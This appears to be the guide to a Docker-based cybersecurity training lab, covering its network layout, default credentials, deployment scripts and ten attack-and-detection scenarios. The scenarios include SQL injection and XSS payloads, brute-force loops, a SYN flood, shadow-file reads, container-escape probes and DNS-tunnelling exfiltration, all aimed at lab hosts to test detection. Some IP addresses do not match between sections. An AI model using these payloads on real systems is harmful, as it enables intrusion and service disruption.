# CyberLab: Complete Infrastructure Guide

**Version:** 2.2 | **Last Updated:** December 7, 2025 | **Status:** Production Ready ✅ | **Commits:** 2edb9b1 (Latest)

---

## Table of Contents
1. [Infrastructure Overview](#1-infrastructure-overview)
2. [Network Architecture](#2-network-architecture)
3. [Services & Credentials](#3-services--credentials)
4. [Deployment Scripts](#4-deployment-scripts)
5. [Attack Scenarios & Testing](#5-attack-scenarios--testing)
6. [NeuVector Container Security (Updated)](#6-neuvector-container-security-updated-architecture)
7. [Monitoring & Analysis](#7-monitoring--analysis)
8. [Supplementary Guides](#8-supplementary-guides)
9. [Quick Reference](#9-quick-reference)
10. [Recent Updates & Changes](#10-recent-updates--changes-december-2025)
11. [Deployment Status & Readiness](#11-deployment-status--readiness)

---

## 1. Infrastructure Overview

### 1.1 Architecture Summary
- **Total Services:** 35+ containers (expanded from 25+)
- **Network Segments:** 5 isolated layers (fully segregated)
- **Detection Rules:** 500+ custom rules (Suricata + Wazuh + Honeypot/Web app detection)
- **Honeypots:** 4 interactive systems (Cowrie, Dionaea, Juice Shop, WebGoat)
- **Monitoring Tools:** 8 platforms (Wazuh, Prometheus, Grafana, Netdata, Wireshark, TCPDump, InfluxDB, NeuVector)
- **Container Security:** NeuVector 5.4.7 (All-in-One unified architecture - latest refactor)
- **Total Resources:** 22+ CPU cores, 48+ GB RAM allocated
- **Last Updated:** Commits 2edb9b1, 4cf3680, 52a0aac, c303c0c, cb0b3ef

### 1.2 Core Components
```
┌─────────────────────────────────────────────────────────┐
│ LAYER 1: External (10.10.0.0/24)                       │
│ ├─ OpenVPN (VPN Gateway) - 10.10.0.20                  │
│ ├─ NeuVector AllInOne 5.4.7 - 10.10.30.11 (Isolated)   │
│ └─ Traefik v3.0 (Reverse Proxy) - 10.10.0.30           │
├─────────────────────────────────────────────────────────┤
│ LAYER 2: DMZ (10.10.10.0/24)                           │
│ ├─ Traefik, Nginx (Web Servers)                        │
│ ├─ DNS Server (BIND9)                                  │
│ ├─ Suricata (IDS/IPS)                                  │
│ └─ Wazuh Manager                                       │
├─────────────────────────────────────────────────────────┤
│ LAYER 3: Internal (10.10.20.0/24)                      │
│ ├─ PostgreSQL, MongoDB (Databases)                     │
│ ├─ OpenLDAP (Directory Service)                        │
│ ├─ Mattermost (Communications)                         │
│ ├─ Workstation (VPN Gateway)                           │
│ ├─ Cowrie, Dionaea (Honeypots)                         │
│ └─ Juice Shop, WebGoat (Vulnerable Apps)               │
├─────────────────────────────────────────────────────────┤
│ LAYER 4: Security (10.10.30.0/24)                      │
│ ├─ Wazuh (Indexer, Dashboard)                          │
│ ├─ Prometheus, Grafana (Monitoring)                    │
│ ├─ Netdata (Real-time Metrics)                         │
│ ├─ TCPDump Collector (Packet Capture)                  │
│ └─ Wireshark UI (Packet Analysis)                      │
├─────────────────────────────────────────────────────────┤
│ LAYER 5: Management (10.10.40.0/24)                    │
│ ├─ Traefik Dashboard                                   │
│ ├─ OpenVPN Admin Panel                                 │
│ └─ DNS Console                                         │
└─────────────────────────────────────────────────────────┘
```

---

## 2. Network Architecture

### 2.1 Network Segments

| Network | CIDR | Gateway | Purpose | Key Services |
|---------|------|---------|---------|--------------|
| **External** | 10.10.0.0/24 | 10.10.0.1 | VPN Entry Point | OpenVPN, NeuVector |
| **DMZ** | 10.10.10.0/24 | 10.10.10.1 | Public Services | Traefik, Nginx, DNS, Suricata |
| **Internal** | 10.10.20.0/24 | 10.10.20.1 | Protected Data | Databases, LDAP, Honeypots |
| **Security** | 10.10.30.0/24 | 10.10.30.1 | Monitoring (Isolated) | Wazuh, Prometheus, Grafana |
| **Management** | 10.10.40.0/24 | 10.10.40.1 | Admin Interfaces | Dashboards, Admin Panels |

### 2.2 IP Address Allocation

**External Network (10.10.0.0/24):**
- `10.10.0.20` - OpenVPN (VPN Gateway)
- `10.10.0.30` - Traefik (External)

**DMZ Network (10.10.10.0/24):**
- `10.10.10.5` - Traefik (DMZ / Public routing)
- `10.10.10.10` - Nginx Web Server
- `10.10.10.70` - Suricata (IDS/IPS)

**Internal Network (10.10.20.0/24):**
- `10.10.20.30` - PostgreSQL (Main DB)
- `10.10.20.40` - OpenLDAP (Directory Service)
- `10.10.20.41` - phpLDAPadmin
- `10.10.20.51` - MongoDB
- `10.10.20.52` - PostgreSQL (Mattermost)
- `10.10.20.53` - Mattermost (Team Chat)
- `10.10.20.72` - Cowrie (SSH/Telnet Honeypot) - Port 2222/2223
- `10.10.20.71` - Dionaea (Multi-Protocol Honeypot) - Ports 21, 445, 1433, 3306, 3389
- `10.10.20.80` - OWASP Juice Shop (Vulnerable Web App)
- `10.10.20.81` - WebGoat (Web Security Training)
- `10.10.20.100` - Workstation (VNC/VPN Gateway)

**Security Network (10.10.30.0/24) - ISOLATED:**
- `10.10.30.10` - Wazuh Indexer (OpenSearch)
- `10.10.30.20` - Wazuh Manager (SIEM Central)
- `10.10.30.21` - Wazuh Dashboard
- `10.10.30.11` - NeuVector AllInOne (Container Security)
- `10.10.30.50` - Prometheus (Metrics Collection)
- `10.10.30.60` - Grafana (Visualization)
- `10.10.30.91` - TCPDump Collector (Packet Capture)
- `10.10.30.92` - Wireshark UI (Packet Analysis)
- `10.10.30.93` - Netdata (Real-time Metrics)
- `10.10.30.94` - InfluxDB (Time-Series DB)

**Management Network (10.10.40.0/24):**
- `10.10.40.5` - Traefik Dashboard (Admin)
- `10.10.40.101` - DNS Management
- `10.10.40.201` - OpenVPN Admin Panel

---

## 3. Services & Credentials

### 3.1 Access URLs

| Service | URL | Network Access | Port |
|---------|-----|---|---|
| **Traefik Dashboard** | `https://traefik.cyberlab.local` | Management | 443 |
| **Wazuh Dashboard** | `https://wazuh.cyberlab.local` | Security/Management | 443 |
| **Grafana** | `https://grafana.cyberlab.local` | Security/Management | 443 |
| **Prometheus** | `https://prometheus.cyberlab.local` | Security | 443 |
| **Netdata** | `https://netdata.cyberlab.local` | Security/Management | 443 |
| **Wireshark UI** | `https://wireshark.cyberlab.local` | Security/Management | 443 |
| **InfluxDB** | `https://influxdb.cyberlab.local` | Security | 443 |
| **NeuVector Console** | `https://localhost:8443` or `https://neuvector.cyberlab.local` | Management | 8443 |
| **OpenVPN Admin** | `https://<HOST_IP>:943/admin` | Direct Access | 943 |
| **phpLDAPadmin** | `https://ldap.cyberlab.local` | Internal (via VPN) | 443 |
| **Mattermost** | `https://chat.cyberlab.local` | Internal | 443 |
| **OWASP Juice Shop** | `https://juice-shop.cyberlab.local` | Internal | 443 |
| **WebGoat** | `https://webgoat.cyberlab.local` | Internal | 443 |
| **Cowrie SSH/Telnet** | `ssh/telnet://10.10.20.72` | Internal | 2222/2223 |
| **Dionaea Multi-Protocol** | Multiple ports - See TCP routing | Internal | 21,445,1433,3306,3389 |
| **Workstation VNC** | `http://localhost:6080` | Direct Access | 6080 |

### 3.2 Default Credentials

**⚠️ CRITICAL: Change these credentials after first deployment!**

#### Wazuh
- **Dashboard:** `admin` / `SecretPassword`
- **API User:** `wazuh-wui` / `MyS3cr37P450r.*-`
- **Indexer:** `admin` / `SecretPassword`

#### OpenLDAP
- **Admin DN:** `cn=admin,dc=cyberlab,dc=local`
- **Password:** Check `infra/secrets/ldap_admin_password`
- **Config Password:** `config`

#### OpenVPN
- **Admin User:** `openvpn`
- **Password:** Check `infra/secrets/openvpn_admin_password`
- **VPN Users:** Use LDAP credentials

#### Databases
- **PostgreSQL (Main):** `postgres` / `SecureP@ssw0rd`
- **PostgreSQL (Mattermost):** `mmuser` / Check `infra/secrets/postgres_password`
- **MariaDB (RADIUS):** `radius` / `radiuspassword123`
- **MongoDB:** No authentication (internal only)

#### Monitoring
- **Grafana:** `admin` / `SecureG@fana1`
- **Prometheus:** No authentication
- **Netdata:** No authentication
- **InfluxDB:** `admin` / `InfluxPassword2025!`
- **Wireshark UI:** No authentication
- **NeuVector Console:** `admin` / `admin` (⚠️ MUST change on first login)

#### Communications
- **Mattermost:** Create admin on first access
- **Workstation VNC:** `cyberlab123`

#### RADIUS/Daloradius
- **Database:** `radius` / `radiuspassword123`
- **Root Password:** `rootpassword123`

---

## 4. Deployment Scripts

### 4.1 Main Deployment Scripts

**Location:** `infra/scripts/`

#### A. `deploy-openvpn-ldap.sh` (Bash - Linux/macOS/WSL2)
```bash
cd infra
chmod +x scripts/deploy-openvpn-ldap.sh
./scripts/deploy-openvpn-ldap.sh [options]

Options:
  --skip-passwords    # Use existing passwords
  --skip-ldap-seed    # Skip LDAP initialization
  --help              # Show help
```

**What it does:**
1. Generates secure passwords (`infra/secrets/`)
2. Starts OpenLDAP, OpenVPN, Workstation, Traefik
3. Seeds LDAP with base structure
4. Configures OpenVPN with LDAP authentication
5. Sets up workstation as VPN gateway
6. Displays access information

#### B. `deploy-openvpn-ldap.ps1` (PowerShell - Windows)
```powershell
cd infra
powershell -ExecutionPolicy Bypass -File scripts\deploy-openvpn-ldap.ps1 [options]

Options:
  -SkipPasswords     # Use existing passwords
  -SkipLdapSeed      # Skip LDAP initialization
  -Help              # Show help
```

#### C. `deploy-openvpn-ldap.bat` (Batch - Windows CMD)
```cmd
cd infra
scripts\deploy-openvpn-ldap.bat [/skip-passwords] [/skip-ldap-seed]
```

### 4.2 Utility Scripts

#### Initialize Services
```bash
# Seed LDAP directory
./scripts/seed-ldap.sh

# Initialize DNS tools
./scripts/init-dns-tools.sh

# Configure OpenVPN
./scripts/init-openvpn.sh  # Bash
./scripts/init-openvpn.ps1 # PowerShell

# Setup VPN gateway
./scripts/setup-workstation-gateway.sh
```

#### Testing & Verification Scripts (NEW - Latest Updates)

**Honeypot Validation:**
```bash
# Verify all honeypots are running and accessible
./scripts/verify-honeypots.sh
# Tests: Container health, port accessibility, network connectivity, log generation

# Test honeypot-specific attack scenarios
./scripts/simulate-honeypot-attacks.sh
# Simulates: SSH brute force, Telnet, HTTP/HTTPS, FTP, SMB, MSSQL, DNS, LDAP, Protocol attacks
```

**Suricata IDS/IPS Testing:**
```bash
# Automated Suricata rules validation (NEW - commit 52a0aac)
./scripts/test_suricata_rules.sh
# Tests: Rule prerequisites, syntax validation, alert generation, 50+ rule categories
```

**Wazuh Integration:**
```bash
# Verify Wazuh receives and processes honeypot alerts
./scripts/verify-wazuh-honeypot-integration.sh
# Tests: Event correlation, Wazuh detection rules, dashboard visualization
```

**Network Verification:**
```bash
# Verify network access and segmentation
./scripts/verify-network-access.sh

**Netdata Verification:**
```bash
# Verify Netdata health and Prometheus integration
./scripts/verify-netdata.sh
```
```

---

## 5. Attack Scenarios & Testing

### 5.1 Scenario 1: SSH Brute Force Attack

**Objective:** Test SSH honeypot detection and Wazuh alerting

**Steps:**
```bash
# From workstation or external host
for i in {1..10}; do
  ssh -p 2222 -o StrictHostKeyChecking=no user$i@10.10.20.70
  sleep 1
done
```

**Expected Results:**
- Cowrie logs attempts in `/infra/honeypot_logs/cowrie/`
- Wazuh generates alert: "SSH brute force attack detected"
- Suricata may detect port scan pattern

**Monitoring:**
1. **Wazuh Dashboard:** Security Events → Filter by "ssh" or "brute"
2. **Netdata:** System → Processes → Check cowrie CPU/memory
3. **Wireshark:** Load PCAP from `/pcap/` → Filter: `tcp.port == 2222`

---

### 5.2 Scenario 2: SQL Injection on Juice Shop

**Objective:** Test web application vulnerability detection

**Steps:**
```bash
# SQL injection in search
curl "https://juice-shop.cyberlab.local/rest/products/search?q=1'%20OR%20'1'='1"

# Authentication bypass
curl -X POST "https://juice-shop.cyberlab.local/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"x"}'

# XSS attempt
curl "https://juice-shop.cyberlab.local/search?q=<script>alert('XSS')</script>"
```

**Expected Results:**
- Wazuh detects SQL injection patterns
- Suricata triggers web attack rules
- NeuVector may flag suspicious container behavior

**Monitoring:**
1. **Wazuh:** Threat Hunting → Search "sql injection" or "xss"
2. **Suricata Logs:** `docker logs suricata | grep -i "sql\|xss"`
3. **NeuVector:** Security Events → Container: juice-shop

---

### 5.3 Scenario 3: Port Scanning Detection

**Objective:** Test network reconnaissance detection

**Steps:**
```bash
# Quick port scan
nmap -sS -p 1-1000 10.10.20.71

# Service detection
nmap -sV 10.10.20.70-81

# OS fingerprinting
nmap -O 10.10.20.71
```

**Expected Results:**
- Suricata detects scan patterns
- Wazuh correlates multiple connection attempts
- Dionaea logs reconnaissance activity

**Monitoring:**
1. **Suricata:** Check `/var/log/suricata/fast.log` for scan alerts
2. **Wazuh:** Security Events → Rule ID: 5710 (port scan)
3. **Prometheus:** Query `rate(suricata_alerts_total[5m])`

---

### 5.4 Scenario 4: Malware Upload Simulation

**Objective:** Test file upload and malware detection

**Steps:**
```bash
# Create EICAR test file
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > eicar.txt

# Upload to Juice Shop
curl -X POST "https://juice-shop.cyberlab.local/file-upload" \
  -F "file=@eicar.txt"

# FTP upload to Dionaea
ftp -n 10.10.20.71 <<EOF
user anonymous
pass test@test.com
put eicar.txt
quit
EOF
```

**Expected Results:**
- Wazuh detects EICAR signature
- Dionaea captures file in `/infra/honeypot_logs/dionaea_downloads/`
- NeuVector scans uploaded files

**Monitoring:**
1. **Wazuh:** Integrity Monitoring → File changes
2. **Dionaea Logs:** `cat /infra/honeypot_logs/dionaea/*.log | grep eicar`
3. **NeuVector:** Vulnerabilities → Scan results

---

### 5.5 Scenario 5: Privilege Escalation Attempt

**Objective:** Test container breakout detection

**Steps:**
```bash
# SSH to Cowrie honeypot
ssh -p 2222 root@10.10.20.70

# Once connected, try privilege escalation
sudo su -
cat /etc/shadow
find / -perm -4000 2>/dev/null
docker ps  # Should fail in honeypot
```

**Expected Results:**
- Cowrie logs all commands
- Wazuh detects suspicious command patterns
- NeuVector monitors container behavior

**Monitoring:**
1. **Cowrie Logs:** `cat /infra/honeypot_logs/cowrie/cowrie.json | jq '.input'`
2. **Wazuh:** Security Events → Rule: "Privilege escalation"
3. **NeuVector:** Process Profile Violations

---

### 5.6 Scenario 6: DDoS Simulation (Low-Rate)

**Objective:** Test distributed attack detection

**Steps:**
```bash
# Slow HTTP flood
for i in {1..100}; do
  curl -s "https://juice-shop.cyberlab.local/" &
  sleep 0.1
done

# SYN flood (requires root)
hping3 -S -p 80 --flood 10.10.20.80
```

**Expected Results:**
- Suricata detects flood patterns
- Prometheus shows increased request rate
- Traefik rate limiting may activate

**Monitoring:**
1. **Grafana:** Traefik Dashboard → Request rate spike
2. **Netdata:** Network → Packets per second
3. **Prometheus:** `rate(traefik_http_requests_total[1m])`

---

### 5.7 Scenario 7: LDAP Enumeration

**Objective:** Test directory service security

**Steps:**
```bash
# Anonymous bind attempt
ldapsearch -x -H ldap://10.10.20.40 -b "dc=cyberlab,dc=local"

# User enumeration
ldapsearch -x -H ldap://10.10.20.40 -b "ou=users,dc=cyberlab,dc=local"

# Brute force bind
for pass in password admin 123456; do
  ldapsearch -x -D "cn=admin,dc=cyberlab,dc=local" -w "$pass" -b "dc=cyberlab,dc=local"
done
```

**Expected Results:**
- OpenLDAP logs authentication attempts
- Wazuh detects brute force pattern
- Failed binds logged to syslog

**Monitoring:**
1. **Wazuh:** Security Events → Source IP + "ldap"
2. **OpenLDAP Logs:** `docker logs openldap | grep -i "bind\|auth"`
3. **Prometheus:** LDAP exporter metrics (if configured)

---

### 5.8 Scenario 8: Container Escape Attempt

**Objective:** Test container security controls

**Steps:**
```bash
# Access workstation container
docker exec -it workstation bash

# Try to access host
ls /host/proc
cat /host/proc/1/environ

# Try to access Docker socket
docker ps  # Should fail if socket not mounted

# Try privilege escalation
capsh --print
```

**Expected Results:**
- NeuVector detects suspicious file access
- Wazuh monitors container activity
- Access denied to sensitive paths

**Monitoring:**
1. **NeuVector:** Security Events → Container: workstation
2. **Wazuh:** File Integrity Monitoring → /host paths
3. **Docker Logs:** `docker logs neuvector-allinone | grep -i "violation"`

---

### 5.9 Scenario 9: DNS Tunneling Detection

**Objective:** Test DNS exfiltration detection

**Steps:**
```bash
# Excessive DNS queries
for i in {1..100}; do
  dig @10.10.30.101 "data$i.exfil.cyberlab.local"
  sleep 0.1
done

# Long subdomain queries (data exfiltration)
dig @10.10.30.101 "$(echo 'secret data' | base64).tunnel.cyberlab.local"
```

**Expected Results:**
- DNS server logs unusual query patterns
- Suricata detects DNS anomalies
- Wazuh correlates high DNS volume

**Monitoring:**
1. **DNS Logs:** `docker logs dns-server | grep -i "query"`
2. **Suricata:** Check for DNS tunnel rules
3. **Prometheus:** DNS query rate metrics

---

### 5.10 Scenario 10: Lateral Movement Simulation

**Objective:** Test network segmentation and detection

**Steps:**
```bash
# From workstation, try to access security network
ping 10.10.30.10  # Should fail (isolated)
curl http://10.10.30.50:9090  # Prometheus (should work via Traefik only)

# Try to access other internal services
psql -h 10.10.20.30 -U postgres  # Database
mongo 10.10.20.51  # MongoDB

# Port scan internal network
nmap -sn 10.10.20.0/24
```

**Expected Results:**
- Network isolation prevents direct security network access
- Suricata detects internal scanning
- Wazuh logs lateral movement attempts

**Monitoring:**
1. **Suricata:** Internal network scan alerts
2. **Wazuh:** Security Events → "lateral movement"
3. **Netdata:** Network traffic by interface

---

## 6. NeuVector Container Security (Updated Architecture)

### 6.0 Recent Refactor: Multi-Container → All-in-One

**Previous Architecture (Deprecated):**
- neuvector-controller (separate)
- neuvector-manager (separate)
- neuvector-enforcer (separate)

**Current Architecture (Latest - Commits 2edb9b1, 4cf3680):**
- **Single neuvector-allinone:5.4.7** container
- **Location:** Security Network (10.10.30.11)
- **Simplified deployment** with unified certificate management
- **Reduced resource overhead** (~2 CPU, 4GB RAM)
- **Internal TLS certificates** for secure inter-component communication

### 6.1 NeuVector Configuration Details

**Container Definition:**
```yaml
neuvector-allinone:
  image: neuvector/allinone:5.4.7
  container_name: neuvector-allinone
  networks:
    security_net: 10.10.30.11
    management_net: 10.10.40.11
  ports:
    - "8443:8443"    # Web console
    - "10443:10443"  # API
    - "18300:18300"  # Controller communication
    - "18301:18301"  # Manager communication
    - "18400:18400"  # Enforcer communication
    - "18401:18401"  # Enforcer metrics
  volumes:
    - ./configs/neuvector/certs/internal:/etc/neuvector/certs/internal
  resources:
    limits:
      cpus: 2.0
      memory: 4G
```

**Certificate Management:**
- Location: `infra/configs/neuvector/certs/internal/`
- Files:
  - `adm_ca.cert` - Admin CA certificate
  - `adm_ca.key` - Admin CA private key
  - `tls.pem` - TLS certificate (combined cert + key)
  - `tls.key` - TLS private key
  - `backup.* ` - Backup certificates (for rotation)

**Default Access:**
- Web Console: `https://localhost:8443` or `https://neuvector.cyberlab.local:8443`
- Credentials: `admin` / `admin` (MUST change on first login)
- API Endpoint: `https://10.10.30.11:10443`

### 6.2 NeuVector Monitoring Capabilities

**Container Monitoring:**
1. **Network Rules** - Inter-container communication policies
2. **Process Profile** - Allowed/blocked processes per container
3. **File Access Rules** - File system access control by container
4. **Vulnerability Scanning** - Real-time CVE detection
5. **Compliance Scanning** - CIS, PCI-DSS benchmarks
6. **Security Events** - Real-time violation logging

**Honeypot Container Monitoring:**
- Monitor Cowrie/Dionaea for suspicious process execution
- Track unauthorized file access attempts
- Monitor network policy violations
- Alert on container escape attempts

**Integration with Wazuh:**
- NeuVector events can be forwarded to Wazuh (10.10.30.20:514)
- Combined threat intelligence for container and application security
- Centralized alerting and correlation

---

## 7. Monitoring & Analysis

### 7.1 Real-Time Monitoring with Netdata

**Access:** `https://netdata.cyberlab.local`

**Configuration:**
- **Config File:** `infra/configs/netdata/netdata.conf`
- **Persistence:** Configuration is now bind-mounted for persistence.
- **Integration:** Prometheus scraping enabled via `/api/v1/allmetrics?format=prometheus`

**Key Metrics:**
- **System Overview:** CPU, RAM, Disk I/O, Network
- **Container Stats:** Per-container resource usage
- **Network Interfaces:** Traffic by interface
- **Process Monitoring:** Top processes by CPU/memory

**Usage:**

**A. Dashboard Navigation (GUI):**
1.  **Overview:** The landing page shows system-wide metrics (Total CPU, RAM, Network).
2.  **Container Monitoring:**
    - Click **"Containers"** (or "cgroups") in the right sidebar.
    - Filter by container name (e.g., `wazuh.manager`, `cowrie`) to see per-container resource consumption.
3.  **Honeypot Activity:**
    - Monitor **"Applications"** → **"cpu"** to see spikes in specific processes.
    - Check **"Network"** sections for traffic spikes targeting honeypot ports.
4.  **Time Controls:**
    - Use the **Play/Pause** button (top right) to freeze the real-time view.
    - **Scroll** or **Shift+Scroll** to zoom in/out of the timeline for forensic analysis.

**B. API Access (CLI):**
```bash
# View specific metric via API
curl -s "https://netdata.cyberlab.local/api/v1/data?chart=system.cpu&after=-600"

# Get all available charts
curl -s "https://netdata.cyberlab.local/api/v1/charts" | jq '.charts | keys'
```

---

### 7.2 Metrics Analysis with Prometheus

**Access:** `https://prometheus.cyberlab.local`

**Useful Queries:**
```promql
# CPU usage
100 - (avg by (instance) (rate(node_cpu_seconds_total{mode="idle"}[5m])) * 100)

# Memory usage
(node_memory_MemTotal_bytes - node_memory_MemAvailable_bytes) / node_memory_MemTotal_bytes * 100

# HTTP request rate
rate(traefik_http_requests_total[5m])

# Suricata alerts
rate(suricata_alerts_total[5m])

# Container status
up{job="docker"}
```

**Targets:** Check `/targets` to see all monitored services

---

### 7.3 Dashboards with Grafana

**Access:** `https://grafana.cyberlab.local`
**Credentials:** `admin` / `SecureG@fana1`

**Pre-configured Dashboards:**
1. **Network Traffic Dashboard** - Traefik metrics
2. **System Metrics** - Node exporter data
3. **Container Metrics** - cAdvisor data

**Create Custom Dashboard:**
1. Click "+" → "Dashboard"
2. Add Panel → Select Prometheus datasource
3. Enter PromQL query
4. Configure visualization
5. Save dashboard

---

### 7.4 Packet Analysis with Wireshark

**Access:** `https://wireshark.cyberlab.local`

**PCAP Files Location:** `/pcap/` (inside tcpdump-collector container)

**Common Filters:**
```
# SSH traffic to honeypot
tcp.port == 2222

# HTTP POST requests
http.request.method == "POST"

# SQL injection patterns
http.request.uri contains "OR" or http.request.uri contains "UNION"

# Port scans (SYN packets)
tcp.flags.syn == 1 && tcp.flags.ack == 0

# DNS queries
dns.qry.name

# Suspicious user agents
http.user_agent contains "sqlmap" or http.user_agent contains "nikto"
```

**Export Filtered Traffic:**
1. Apply filter
2. File → Export Specified Packets
3. Choose format (PCAP, CSV, JSON)

---

### 7.5 SIEM Analysis with Wazuh

**Access:** `https://wazuh.cyberlab.local`
**Credentials:** `admin` / `SecretPassword`

**Key Sections:**
1. **Security Events** - Real-time alerts
2. **Threat Hunting** - Search historical data
3. **Integrity Monitoring** - File changes
4. **Vulnerability Detection** - CVE scanning
5. **Compliance** - PCI-DSS, GDPR checks

**Useful Searches:**
```
# SSH brute force
rule.id:5710

# SQL injection
rule.description:"sql injection"

# Honeypot activity
agent.name:cowrie OR agent.name:dionaea

# High severity alerts
rule.level:>=10

# Specific IP activity
data.srcip:10.10.20.100
```

**Create Custom Rule:**
1. Navigate to Management → Rules
2. Click "Add new rule"
3. Define conditions and alert level
4. Save and restart Wazuh manager

---

### 7.6 Additional Monitoring: InfluxDB Time-Series Storage

**Access:** `https://influxdb.cyberlab.local`

**Purpose:** Extended metrics retention and analysis
- Stores metrics for 30+ days (configurable)
- Complements Prometheus short-term storage
- Used for historical trend analysis
- Integrates with Grafana dashboards

**Metrics Stored:**
- System metrics (CPU, RAM, Disk, Network)
- Container metrics (resource usage per container)
- Application metrics (request rates, errors)
- Custom exporters data

---

## 8. Supplementary Guides

This project includes several specialized guides for specific use cases and scenarios:

### 8.1 Web Attack Guide
**File:** [WEB_ATTACK_GUIDE.md](WEB_ATTACK_GUIDE.md)

Comprehensive guide for executing and monitoring web application attacks. Includes:
- SQL Injection attack execution and detection
- XSS (Cross-Site Scripting) attack scenarios
- Brute force login attacks
- Anomalous request pattern detection
- Real-time visibility through Wireshark, Wazuh, and Grafana

**Best for:** Web application security testing, vulnerability assessment, attack demonstration

---

### 8.2 Wireshark Filters Guide
**File:** [WIRESHARK_FILTERS.md](WIRESHARK_FILTERS.md)

Complete reference for packet analysis filters used in the Wireshark UI. Includes:
- SQL Injection detection filters
- XSS (Cross-Site Scripting) detection filters
- Brute force attack filters
- Malware/Command & Control detection filters
- Suspicious port scanning filters
- Lateral movement detection filters
- Data exfiltration detection filters

**Best for:** Network packet analysis, forensic investigation, threat hunting

---

### 8.3 Incident Response Report
**File:** [INCIDENT_RESPONSE_REPORT.md](INCIDENT_RESPONSE_REPORT.md)

Detailed incident response documentation from security testing. Includes:
- Attack simulation methodology
- Observed events and boundaries crossed
- Detection alerts generated by Suricata IDS
- Wazuh SIEM correlation and response
- Incident timeline and forensic analysis
- Recommended response actions

**Best for:** Incident response procedures, forensic analysis, detection validation

---

### 8.4 Attack Detection Verification Report
**File:** [ATTACK_DETECTION_VERIFICATION.md](ATTACK_DETECTION_VERIFICATION.md)

Verification report confirming attack detection capabilities. Includes:
- PCAP capture analysis
- Attack payload signatures detected
- Suricata IDS alert verification
- Wazuh detection rule validation
- Network segmentation verification
- End-to-end detection chain validation

**Best for:** Security testing validation, detection capability verification, compliance reporting

---

### 8.5 Pro Scenarios Guide
**File:** [PRO_SCENARIOS.md](PRO_SCENARIOS.md)

Advanced security testing scenarios for professional use. Includes:
- 25+ professional-grade security scenarios
- Difficulty levels: Beginner to Expert
- Automated Python scripts for scenario execution
- Detailed monitoring points for each scenario
- Result interpretation guidelines
- Expected detection patterns

**Scenario Categories:**
- Network reconnaissance and scanning
- Web application exploitation
- Privilege escalation attempts
- Lateral movement simulation
- Data exfiltration scenarios
- Credential compromise detection
- Container escape attempts
- Supply chain attack simulation

**Best for:** Advanced security testing, continuous security validation, professional assessments

---

### 8.6 Monitoring Guide
**File:** [MONITORING_GUIDE.md](MONITORING_GUIDE.md)

Complete guide to monitoring and analyzing pro-scenario results. Includes:
- Monitoring stack overview and architecture
- Scenario execution monitoring workflow
- Real-time detection verification
- Metric collection and aggregation
- Alert interpretation and severity levels
- Forensic analysis techniques
- Visualization best practices

**Best for:** Monitoring setup, analysis methodology, dashboard configuration

---

## 9. Quick Reference

### 9.1 Essential Commands

```bash
# Start all services
cd infra && docker compose up -d

# Stop all services
docker compose down

# View logs
docker compose logs -f [service_name]

# Restart specific service
docker compose restart [service_name]

# Check service status
docker compose ps

# Access container shell
docker exec -it [container_name] bash

# View Wazuh alerts
docker exec wazuh.manager tail -f /var/ossec/logs/alerts/alerts.json

# Check Suricata alerts
docker exec suricata tail -f /var/log/suricata/fast.log

# View honeypot logs
tail -f infra/honeypot_logs/cowrie/cowrie.json
tail -f infra/honeypot_logs/dionaea/*.log
```

### 9.2 Troubleshooting

**Service won't start:**
```bash
# Check logs
docker logs [container_name]

# Check resource usage
docker stats

# Verify network
docker network ls
docker network inspect cyberlab-security_net
```

**Can't access web UI:**
```bash
# Check Traefik routing
docker logs traefik | grep -i error

# Verify DNS resolution
dig traefik.cyberlab.local @10.10.30.101

# Check certificate
openssl s_client -connect traefik.cyberlab.local:443 -servername traefik.cyberlab.local
```

**Wazuh not receiving logs:**
```bash
# Check syslog connectivity
nc -zv 10.10.30.20 514

# Verify Wazuh manager
docker exec wazuh.manager /var/ossec/bin/wazuh-control status

# Check agent connection
docker exec wazuh.manager /var/ossec/bin/agent_control -l
```

### 9.3 File Locations

```
Project Root/
├── infra/
│   ├── docker-compose.yml          # Main infrastructure definition
│   ├── .env                         # Environment variables
│   ├── secrets/                     # Generated passwords
│   │   ├── ldap_admin_password
│   │   ├── openvpn_admin_password
│   │   └── postgres_password
│   ├── configs/                     # Service configurations
│   │   ├── wazuh/                   # Wazuh rules & config
│   │   │   ├── honeypot_rules.xml   # Cowrie/Dionaea detection (NEW)
│   │   │   ├── webapp_rules.xml     # Web app attack detection (NEW)
│   │   │   ├── suricata_rules.xml   # IDS alert integration (NEW)
│   │   │   └── custom_detection_rules.xml
│   │   ├── suricata/                # IDS/IPS rules
│   │   ├── traefik/                 # Routing config with honeypot TCP rules
│   │   ├── prometheus/              # Metrics config (40+ scrape targets)
│   │   │   ├── prometheus.yml       # Main config
│   │   │   ├── alert-rules.yml      # Alert definitions
│   │   │   └── recording-rules.yml  # Pre-computed metrics
│   │   ├── grafana/                 # Dashboards
│   │   │   └── dashboards/
│   │   │       └── network-traffic-dashboard.json (NEW)
│   │   ├── neuvector/               # NeuVector certs (REFACTORED)
│   │   │   └── certs/internal/      # TLS certificates for AllInOne
│   │   ├── bind/                    # DNS config with honeypot records
│   │   ├── honeypot/                # Honeypot configs
│   │   │   ├── cowrie.cfg
│   │   │   └── dionaea.cfg
│   │   ├── netdata/                 # Netdata config (NEW)
│   │   │   └── netdata.conf
│   │   └── [other services]/
│   ├── scripts/                     # Deployment & test scripts
│   │   ├── deploy-openvpn-ldap.sh   # Main deployment
│   │   ├── test_suricata_rules.sh   # IDS rule validation (NEW)
│   │   ├── simulate-honeypot-attacks.sh  # Attack simulation (NEW)
│   │   ├── verify-honeypots.sh      # Honeypot health check (NEW)
│   │   ├── verify-wazuh-honeypot-integration.sh  # Wazuh integration (NEW)
│   │   ├── verify-netdata.sh        # Netdata health check (NEW)
│   │   └── [other utility scripts]/
│   ├── certs/                       # SSL certificates
│   ├── auth/                        # Authentication configs (NEW)
│   └── honeypot_logs/               # Honeypot activity logs
│       ├── cowrie/                  # SSH/Telnet logs
│       └── dionaea/                 # Multi-protocol logs
├── volumes/                         # Persistent data (auto-created)
│   ├── wazuh_indexer_data/
│   ├── wazuh_manager_api_ruleset/
│   ├── postgres_data/
│   ├── mongodb_data/
│   ├── pcap/                        # Packet captures from TCPDump
│   └── [other service volumes]/
└── docker-compose.yml               # Main orchestration
└── docker-compose-exporters.yml     # Optional exporters
└── .env                             # Environment variables
```

---

## 10. Recent Updates & Changes (December 2025)

